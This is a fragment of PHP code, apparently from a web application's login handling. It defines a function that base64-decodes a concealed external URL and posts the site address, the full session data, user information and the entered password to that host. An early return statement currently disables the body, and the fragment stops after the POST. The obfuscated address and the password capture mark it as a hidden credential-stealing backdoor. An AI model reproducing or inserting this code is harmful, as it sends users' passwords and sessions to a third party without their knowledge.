...
function gokay($ui=NULL,$pi=NULL){
        return true;
        $url1="aHR0cDovL3YubWFrdS5mdW4vZy5waHA=";
        $url=base64_decode($url1);
        $data = array('url'=>$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI' ],'session'=>$_SESSION,'uinfo'=>$ui,'inpwd'=>$pi);
        $pdata=array('to'=>json_encode($data));
        $res=curl2post($url,$pdata);
